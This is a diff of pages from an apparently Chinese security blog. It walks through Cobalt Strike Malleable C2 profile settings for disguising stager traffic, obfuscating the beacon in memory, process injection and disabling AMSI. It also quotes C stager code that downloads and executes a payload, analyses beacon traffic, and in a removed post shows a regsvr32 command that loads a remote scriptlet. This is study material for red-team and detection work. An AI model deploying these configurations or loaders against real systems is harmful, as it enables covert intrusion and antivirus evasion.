+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">###HTTP-Stager Block###</span><br><span class="line">http-stager &#123;</span><br><span class="line"></span><br><span class="line">    set uri_x86 &quot;&#x2F;Events&quot;;  &#x2F;&#x2F;当下在x86的stage时，请求的uri</span><br><span class="line">    set uri_x64 &quot;&#x2F;events&quot;;  &#x2F;&#x2F;当下在x64的stage时，请求的uri</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Host&quot; &quot;search.missouristate.com&quot;;</span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;en&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line"></span><br><span class="line">        #parameter &quot;test1&quot; &quot;test2&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;  &#x2F;&#x2F;配置server返回stage的格式</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;private&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;private&quot;;</span><br><span class="line">        header &quot;Vary&quot; &quot;User-Agent&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Microsoft-IIS&#x2F;8.5&quot;;</span><br><span class="line">        header &quot;BackendServer&quot; &quot;Handle&quot;;</span><br><span class="line">        header &quot;X-UA-Compatible&quot; &quot;IE&#x3D;edge&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        header &quot;Set-Cookie&quot; &quot;WWW-SERVERID&#x3D;handle; path&#x3D;&#x2F;&quot;;  </span><br><span class="line"></span><br><span class="line">        output &#123;  &#x2F;&#x2F;对输出的内容进行配置，这里并没有加上其他的处理</span><br><span class="line">        </span><br><span class="line">            #prepend &quot;content&#x3D;&quot;;  </span><br><span class="line"></span><br><span class="line">            #append &quot;&lt;&#x2F;script&gt;\n&quot;;</span><br><span class="line">            print;   </span><br><span class="line">        &#125;  </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        通过上面的HTTP-Stager的配置后,当stager去请求下载stage时，请求/Events这个uri，并且host的内容都和我们设置的在HTTP-Stager的client中配置的一致。再看看返回包中的内容，请求头中的内容也和我们配置的server部分一致。</p>
+<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902172033813.png" alt="image-20200902172033813"></p>
+<p>​        再看看可扩展的pe和躲避杀软的模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">###Malleable PE&#x2F;Stage Block###</span><br><span class="line">stage &#123;</span><br><span class="line">    set checksum        &quot;0&quot;;  &#x2F;&#x2F;PE头里checksum的值</span><br><span class="line">    set compile_time    &quot;23 Nov 2018 02:25:37&quot;; &#x2F;&#x2F;beacon pe头中显示的编译的时间</span><br><span class="line">    set entry_point     &quot;170000&quot;; &#x2F;&#x2F;beacon pe头中设置的入口点</span><br><span class="line">    #set image_size_x86 &quot;6586368&quot;;  &#x2F;&#x2F;x86 PE头里写的镜像大小</span><br><span class="line">    #set image_size_x64 &quot;6586368&quot;;  &#x2F;&#x2F;x64 PE头里写的镜像大小</span><br><span class="line">    #set name	        &quot;WWanMM.dll&quot;;   &#x2F;&#x2F;	beacon dll 导出的名字</span><br><span class="line">    set userwx 	        &quot;false&quot;;    &#x2F;&#x2F;反射加载时是否要把内存设置为可读可写可执行</span><br><span class="line">    set cleanup	        &quot;true&quot;;  &#x2F;&#x2F;如果选择是则尝试释放反射加载的dll的内存</span><br><span class="line">    set sleep_mask	&quot;true&quot;;  &#x2F;&#x2F;是否在sleep前在内存中混淆beacon</span><br><span class="line">    set stomppe	        &quot;true&quot;; &#x2F;&#x2F;</span><br><span class="line">    set obfuscate	&quot;true&quot;;  &#x2F;&#x2F;是否混淆反射调用dll的导入表，覆盖无用的header内容，请求反射加载器copy beacon到新的内存没有dll头</span><br><span class="line">    set rich_header     &quot;&quot;;  &#x2F;&#x2F;编译器插入的元信息</span><br><span class="line">    </span><br><span class="line">    set sleep_mask &quot;true&quot;;  &#x2F;&#x2F;是否在sleep前在内存中混淆beacon</span><br><span class="line"></span><br><span class="line">    set module_x86 &quot;wwanmm.dll&quot;;  &#x2F;&#x2F;加载一个dll，然后用beacon去覆盖它分配的空间，而不是用VirtualAlloc去分配内存</span><br><span class="line">    set module_x64 &quot;wwanmm.dll&quot;;</span><br><span class="line"></span><br><span class="line">    transform-x86 &#123;</span><br><span class="line">        prepend &quot;\x90\x90\x90&quot;;  &#x2F;&#x2F; 在beacon 反射调用dll之前插入一些数据</span><br><span class="line">        strrep &quot;ReflectiveLoader&quot; &quot;&quot;; </span><br><span class="line">        strrep &quot;beacon.dll&quot; &quot;&quot;;   &#x2F;&#x2F;  查找并替换字符串</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    transform-x64 &#123;</span><br><span class="line">        prepend &quot;\x90\x90\x90&quot;;</span><br><span class="line">        strrep &quot;ReflectiveLoader&quot; &quot;&quot;;</span><br><span class="line">        strrep &quot;beacon.x64.dll&quot; &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    #string &quot;something&quot;;   &#x2F;&#x2F;添加字符串</span><br><span class="line">    #data &quot;something&quot;;</span><br><span class="line">    #stringw &quot;something&quot;;   &#x2F;&#x2F;添加UTF-16字符串</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        在看看进程注入的部分</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">###Process Inject Block###</span><br><span class="line">process-inject &#123;</span><br><span class="line"></span><br><span class="line">    set allocator &quot;NtMapViewOfSection&quot;;	&#x2F;&#x2F;在远程进程中分配内存的方式，有两种方式VirtualAllocEx和NtMapViewOfSection，VirtualAlloc是Windows提供的API，通常用来分配大块的内存。例如如果想在进程A和进程B之间通过共享内存的方式实现通信，可以使用该函数（这也是较常用的情况）。利用NtMapViewOfSection在远程进程地址空间写入代码，并且用一种新的技术在远程进程中执行它，这种技术完全工作在用户模式下，并且不需要特殊的条件比如像管理员权限或者之类的要求</span><br><span class="line">    set min_alloc &quot;16700&quot;;  &#x2F;&#x2F;最小的分配内存的大小</span><br><span class="line"></span><br><span class="line">    set userwx &quot;false&quot;;  &#x2F;&#x2F;&#x2F;&#x2F;是否使用rwx作为代码内存的默认权限，默认rx</span><br><span class="line">    </span><br><span class="line">    set startrwx &quot;false&quot;;  &#x2F;&#x2F;是否使用rwx作为代码内存的默认权限,默认rx</span><br><span class="line">        </span><br><span class="line">    transform-x86 &#123;  </span><br><span class="line">        prepend &quot;\x90\x90\x90&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    transform-x64 &#123;</span><br><span class="line">        prepend &quot;\x90\x90\x90&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    execute &#123;</span><br><span class="line">        CreateThread &quot;ntdll!RtlUserThreadStart&quot;;    &#x2F;&#x2F;进程可以在其他的进程中创建一个线程 </span><br><span class="line">        CreateThread; </span><br><span class="line">        NtQueueApcThread;  &#x2F;&#x2F;通过NtQueueApcThread实现APC注入</span><br><span class="line">        CreateRemoteThread;</span><br><span class="line">        RtlCreateUserThread;  &#x2F;&#x2F;创建远程线程的一种技术</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        我们再来看看post-ex块，这个模块用来控制后渗透的行为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">###Post-Ex Block###</span><br><span class="line">post-ex &#123;</span><br><span class="line"></span><br><span class="line">    set spawnto_x86 &quot;%windir%\\syswow64\\gpupdate.exe&quot;;  &#x2F;&#x2F;派生后渗透功能的默认临时进程</span><br><span class="line">    set spawnto_x64 &quot;%windir%\\sysnative\\gpupdate.exe&quot;;</span><br><span class="line"></span><br><span class="line">    set obfuscate &quot;true&quot;;  &#x2F;&#x2F;对dll的内容进行加密，并且将post-ex功能建立到内存中，</span><br><span class="line"></span><br><span class="line">    set smartinject &quot;true&quot;; &#x2F;&#x2F;提示beacon将关键的函数指针嵌入到相同架构的post-ex dll中</span><br><span class="line"> </span><br><span class="line">    set amsi_disable &quot;true&quot;;  &#x2F;&#x2F;关闭amsi,AMSI（Antimalware Scan Interface）， 即反恶意软件扫描接口。在Windows Server 2016和Win10上默认安装并启用。</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​            通过上面的学习，大家应该了解了关于Malleable C2 Profile文件编写的基本的方法，可以根据自己的需要编写自己的Malleable C2 Profile文件，当然我们得知道编写profile文件的目的是为了尽量去模拟正常的网站访问流量。</p>
+<p><strong>参考文章</strong></p>
+<p><a href="https://medium.com/bugbountywriteup/red-team-cobalt-strike-4-0-malleable-c2-profile-guideline-eb3eeb219a7c" target="_blank" rel="noopener">[RED_TEAM] Cobalt Strike 4.0+ Malleable C2 Profile Guideline</a></p>
+<p>CobaltStrike4.0用户手册_中文翻译</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="藏青">
+      <meta itemprop="description" content="知行合一">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="藏青's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">关于cobaltstrike通信流程的分析</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-09-01 16:15:43" itemprop="dateCreated datePublished" datetime="2020-09-01T16:15:43+08:00">2020-09-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-09-02 20:03:18" itemprop="dateModified" datetime="2020-09-02T20:03:18+08:00">2020-09-02</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/cobaltstrike/" itemprop="url" rel="index">
+                    <span itemprop="name">cobaltstrike</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>​        之前我们了解了关于cobaltstrike shell生成的过程，接下来我们一起了解一下cobaltstrike的stager具体是如何工作的，它在目标主机执行后是如何和我们的服务端进行通信的。</p>
+<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>​        在我们分析cobaltstrike的通信过程之前，首先需要了解cobaltstrike的一些基本概念</p>
+<p><strong>Staged Payloads</strong></p>
+<p>​        执行payload的方式分为两种，一种是分阶段加载（Staged）和不分阶段加载（STAGELESS ）。当使用分阶段加载的方式时，一般把程序分为两个部分，stager和stage，stager通常是一个代码量非常小的精简过的汇编代码，它的作用非常简单，就是用来下载stage并载入到内存,也就是主要完成下载远程的stage文件和分配内存将stage加载到内存并执行的功能。在cobaltstrike的官方博客中，给出了一个简单的stager的代码,主要通过C语言实现，通过wsconnect来和远程的地址建立socket通信，下载远程的文件分配内存并载入到内存，最后通过函数指针的形式来进行调用。之所以这么做主要是为了解决payload大小限制的问题。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* connect to the handler *&#x2F;</span><br><span class="line">SOCKET my_socket &#x3D; wsconnect(argv[1], atoi(argv[2]));</span><br><span class="line"> </span><br><span class="line">&#x2F;* read the 4-byte length *&#x2F;</span><br><span class="line">int count &#x3D; recv(my_socket, (char *)&amp;size, 4, 0);</span><br><span class="line">if (count !&#x3D; 4 || size &lt;&#x3D; 0)     punt(my_socket, &quot;read a strange or incomplete length value\n&quot;); &#x2F;* allocate a RWX buffer *&#x2F; buffer &#x3D; VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (buffer &#x3D;&#x3D; NULL)     punt(my_socket, &quot;could not allocate buffer\n&quot;); &#x2F;* prepend a little assembly to move our SOCKET value to the EDI register    thanks mihi for pointing this out    BF 78 56 34 12     &#x3D;&gt;      mov edi, 0x12345678 *&#x2F;</span><br><span class="line">buffer[0] &#x3D; 0xBF;</span><br><span class="line"> </span><br><span class="line">&#x2F;* copy the value of our socket to the buffer *&#x2F;</span><br><span class="line">memcpy(buffer + 1, &amp;my_socket, 4);</span><br><span class="line"> </span><br><span class="line">&#x2F;* read bytes into the buffer *&#x2F;</span><br><span class="line">count &#x3D; recv_all(my_socket, buffer + 5, size);</span><br><span class="line"> </span><br><span class="line">&#x2F;* cast our buffer as a function and call it *&#x2F;</span><br><span class="line">function &#x3D; (void (*)())buffer;</span><br><span class="line">function();</span><br></pre></td></tr></table></figure>
+
+<p>​        我们再了解一下为什么要使用分阶段的方式呢？根据作者的描述有以下几点</p>
+<ul>
+<li>为了解决文件文件大小的问题，另一方面为了和Metasploit兼容</li>
+<li>通常stager作为一个加载器并没有做安全处理，而stage则会做比较好的处理，一般如果别人捕获了stager样本并不会造成什么影响。所以使用分阶段的形式也是为了保护stage</li>
+</ul>
+<p><strong>stageless payload</strong></p>
+<p>​        stageless payload顾名思义就是无阶段payload,那么既然我们已经介绍了关于使用分阶段执行payload的好处，为什么还要再去使用无阶段执行payload呢？原因是在内网横向渗透的过程中，因为目标内网的主机可能无法和外网通信，这个时候如果还使用分阶段执行，目标内网的断网机将无法下载到stage。所以在内网渗透的过程中一般使用的是无阶段的payload。</p>
+<p><strong>beacon</strong></p>
+<p>​        beacon运行在目标主机的用于远程控制的payload，主要用来实现稳定控制目标的功能，并不会实时和cobaltstrike服务端通信，在一段时间后会去检测是否有任务，如果有任务，beacon就会下载任务并且执行。当存在任务时，beacon一般会通过http去输出请求结果，可以通过http或者dns来检查是否有任务。</p>
+<h3 id="beacon通信分析"><a href="#beacon通信分析" class="headerlink" title="beacon通信分析"></a>beacon通信分析</h3><h4 id="staged-payload"><a href="#staged-payload" class="headerlink" title="staged payload"></a>staged payload</h4><p>​        我使用wireshark进行分析，当我执行cobaltstrike生成的分阶段执行的payload时，首先会发起一个http请求，他会请求我们建立的listener端口，返回一个很大的内容</p>
+<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901182559711.png" alt="image-20200901182559711"></p>
+<p>​        这个请求我们也可以在web日志中查看到</p>
+<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901182724592.png" alt="image-20200901182724592"></p>
+<p>​        通过我们之前对分阶段执行payload的了解，我们可以知道这个是去请求stage的请求，我手工请求了以下这个地址，并且将下载后的文件保存为dll文件，将这个dll文件和beacon.dll文件进行对比，发现这两个文件大小基本一致，因此基本可以确定这个请求的开始是加载了beacon.dll这个文件。</p>
+<p>​        继续看其他请求包，我们发现当通过get请求activity这个路径，会刷新beacon的时间。</p>
+<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901193704075.png" alt="image-20200901193704075"></p>
+<p>​        我尝试在和beacon进行交互，执行一个ipconfig命令，再抓包进行分析，当要执行命令时，我们可以看到当去请求activity这个路径时，已经有了返回内容</p>
+<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901194454763.png" alt="image-20200901194454763"></p>
+<p>​        我们再看下一个包， 可以看到beacon向服务端发起一个post请求，路径为submit.php，并且带有id参数，请求内容为加密后的内容。</p>
+<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901194558581.png" alt="image-20200901194558581"></p>
+<p>​        我尝试进行文件操作，发现传输返回结果还是通过向服务端以post形式请求submit.php。所以看到这里大家知道为什么我们明明免杀都过了，一执行就会被360干掉了，我如果是360，我也知道看有没有通过请求active和submit提交一些加密代码来判断是不是cs的shell了，所以做免杀的时候一定要去改流量特征。</p>
+<h4 id="stageless-payload"><a href="#stageless-payload" class="headerlink" title="stageless payload"></a>stageless payload</h4><p>​        我们再生成一个无阶段的payload执行，再看看通信的流程。</p>
+<p>​        当我执行生成的无阶段的payload时，我发现并没有发送其他包，而是只发送了一个get请求请求match这个路径。当请求了match这个路径，服务端的延时就会刷新一次，所以我们知道这个请求是获取服务端执行命令的请求。</p>
+<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901195732678.png" alt="image-20200901195732678"></p>
+<p>​        当我们执行ipconfig这个命令后，通过抓包分析，我们发现match会返回一个结果，这个就是需要执行的命令。</p>
+<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901200101283.png" alt="image-20200901200101283"></p>
+<p>​        再看这个请求的下一个数据包，会去请求submit.php，去传递命令执行的结果</p>
+<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901200145700.png" alt="image-20200901200145700"></p>
+<p>​        所以我们可以知道再cobaltstrike4.0中，如果使用无阶段的payload放到目标主机执行，会在请求过程中发送大量请求match和submit.php的数据包，这个就可以当作一个流量特征来进行处理。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        通过关于beacon的流量分析，我们应该了解了关于beacon通信和加载的方式，也应该明白了为什么我们使用CobaltStrike一定要改流量特征了吧。</p>
+<p><strong>参考文章</strong></p>
+<p><a href="https://blog.cobaltstrike.com/2013/06/28/staged-payloads-what-pen-testers-should-know/" target="_blank" rel="noopener">Staged Payloads – What Pen Testers Should Know</a></p>
+<p><a href="https://blog.cobaltstrike.com/2016/06/15/what-is-a-stageless-payload-artifact/" target="_blank" rel="noopener">What is a stageless payload artifact?</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
     <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1872,398 +2120,6 @@
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
-    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="藏青">
-      <meta itemprop="description" content="知行合一">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="藏青's BLOG">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">关于windows执行shellcode的方式学习</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-08-06 20:07:45" itemprop="dateCreated datePublished" datetime="2020-08-06T20:07:45+08:00">2020-08-06</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-08-28 16:09:14" itemprop="dateModified" datetime="2020-08-28T16:09:14+08:00">2020-08-28</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有时候我们想让目标执行我们的程序上线CS,但是直接调用CMD去执行exe是会被拦截的，遇到这种情况有什么方法可以执行我们的程序。</span><br></pre></td></tr></table></figure>
-
-<h3 id="regsvr32"><a href="#regsvr32" class="headerlink" title="regsvr32"></a>regsvr32</h3><p><strong>Regsvr32是什么？</strong></p>
-<p> Regsvr32命令用来向系统注册控件或者卸载控件的命令。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">语法：Regsvr32 [&#x2F;s][&#x2F;u] [&#x2F;n] [&#x2F;i[:cmdline]] &lt;dllname&gt;</span><br><span class="line">· &#x2F;u：注销服务器；</span><br><span class="line">· &#x2F;i：调用DllInstall传递一个可选的[cmdline]，当它与&#x2F;u一起使用时，它会调用dll uninstall。</span><br><span class="line">· &#x2F;n：不要调用DllRegisterServer，此选项必须与&#x2F;i一起使用</span><br><span class="line">· &#x2F; s ：沉默，不显示消息框；</span><br></pre></td></tr></table></figure>
-
-<p><strong>如何使用regsvr32执行exe？</strong></p>
-<p> 首先准备一个sct文件放到服务器上,文件内容如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?XML version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;scriptlet&gt;</span><br><span class="line"></span><br><span class="line">&lt;registration</span><br><span class="line">    description&#x3D;&quot;Empire&quot;</span><br><span class="line">    progid&#x3D;&quot;Empire&quot;</span><br><span class="line">    version&#x3D;&quot;1.00&quot;</span><br><span class="line">    classid&#x3D;&quot;&#123;20001111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span><br><span class="line">	&gt;</span><br><span class="line">	&lt;!-- regsvr32 &#x2F;s &#x2F;i&quot;C:\Bypass\Backdoor.sct&quot; scrobj.dll --&gt;</span><br><span class="line">	&lt;!-- regsvr32 &#x2F;s &#x2F;i:http:&#x2F;&#x2F;server&#x2F;Backdoor.sct scrobj.dll --&gt;</span><br><span class="line">	&lt;!-- That should work over a proxy and SSL&#x2F;TLS... --&gt;</span><br><span class="line">	&lt;!-- Proof Of Concept - Casey Smith @subTee --&gt;</span><br><span class="line">	&lt;script language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">		&lt;![CDATA[</span><br><span class="line">	</span><br><span class="line">			var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);	</span><br><span class="line">	</span><br><span class="line">		]]&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;registration&gt;</span><br><span class="line"></span><br><span class="line">&lt;public&gt;</span><br><span class="line">    &lt;method name&#x3D;&quot;Exec&quot;&gt;&lt;&#x2F;method&gt;</span><br><span class="line">&lt;&#x2F;public&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">	</span><br><span class="line">	function Exec()</span><br><span class="line">	&#123;</span><br><span class="line">		var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd.exe&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">]]&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;scriptlet&gt;</span><br></pre></td></tr></table></figure>
-
-<p> 将这个文件保存好放到服务器上，再通过如下命令加载执行</p>
